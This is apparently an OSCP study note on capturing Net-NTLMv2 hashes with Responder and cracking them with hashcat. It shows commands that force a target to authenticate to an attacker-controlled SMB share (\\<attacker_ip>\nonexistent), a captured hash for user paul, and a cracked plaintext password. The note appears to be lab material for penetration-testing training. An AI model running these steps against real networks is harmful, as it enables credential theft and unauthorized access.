---
aliases:
  - Crack NTLM Hashes
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - password
  - password_hash
  - ntlm
  - hash
  - ntlmv2
  - crack_hash
  - crack_the_hash
  - net-ntlmv2
author: Mehdi N Tehrani
creat_date: 2023-12-30
category: Cyber Security
subcategory: Offensive Security - OSCP
---

NTLMv2 (Net-NTLMv2) protocol is responsible for managing the authentication process for Windows clients and servers over a network.

# Authentication Process
At a high level: 
1. we'll send the server a request, outlining the connection details to access the SMB share. 
2. Then the server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity. 
3. The server will then check our challenge response and either grant or deny access, accordingly.

The majority of Windows environments still rely on the older protocol, especially as a way to support older devices that may not support Kerberos.

We need our target to start an authentication process using Net-NTLMv2 against a system we control.

# Responder
#responder
[Responder GitHub](https://github.com/lgandx/Responder)
Responder includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes. We can set up responder to listen for multicast calls and respond to them to capture NTLMv2 hashes of users. 
- Example: 
if there's a file upload capability on a web site, we can point to a non-existent path e.g. `\\<attacker_ip>\non-existent-path` and if server supports SMB upload, the web server gets forced to try to authenticate to our SMB server (Responder).


## Capabilities
- [poisoning](https://attack.mitre.org/techniques/T1557/001/) #poisoning
- SMB #smb
- HTTP #http
- FTP #ftp
- [LLMNR](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution) (Link-Local Multicast Name Resolution) #llmnr 
- [NBT-NS](https://en.wikipedia.org/wiki/NetBIOS) (NetBIOS Name Service) #netbios
- [Multicast DNS](https://en.wikipedia.org/wiki/Multicast_DNS) (MDNS) #mdns #multicast_dns #dns


## Process
1. Set up listening on SMB calls with Responder
```sh
sudo responder -I tun0

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]

```
2. if we have a shell on the target, we can force authentication
```cmd
C:\> dir \\<attacker_ip>\nonexistent
:: or
C:\> pushd \\<attacker_ip>\nonexistent
```
or
```powershell
PS C:\> ls \\<attacker_ip>\nonexistent
```
3. Capture the hash on attacker's machine
```
[SMB] NTLMv2-SSP Client   : 192.168.245.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:85693bd0df8bba85:2759F7523783D9FA6CB1CB1DF50814A6:01010000000000000097DE32D53CDA0181B0040D0F7B72B900000000020008004D0033003600580001001E00570049004E002D005600360043005200410031003600460052003600320004003400570049004E002D00560036004300520041003100360046005200360032002E004D003300360058002E004C004F00430041004C00030014004D003300360058002E004C004F00430041004C00050014004D003300360058002E004C004F00430041004C00070008000097DE32D53CDA010600040002000000080030003000000000000000000000000020000007881F41001452D857AC74E8A55F778CFB5F7821B51A2A755405199AF27D41A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310036000000000000000000
```
4. Crack the NTLMv2 hash:
```
$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

PAUL::FILES01:85693bd0df8bba85:2759f7523783d9fa6cb1cb1df50814a6:01010000000000000097de32d53cda0181b0040d0f7b72b900000000020008004d0033003600580001001e00570049004e002d005600360043005200410031003600460052003600320004003400570049004e002d00560036004300520041003100360046005200360032002e004d003300360058002e004c004f00430041004c00030014004d003300360058002e004c004f00430041004c00050014004d003300360058002e004c004f00430041004c00070008000097de32d53cda010600040002000000080030003000000000000000000000000020000007881f41001452d857ac74e8a55f778cfb5f7821b51a2a755405199af27d41a80a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310036000000000000000000:123Password123
```

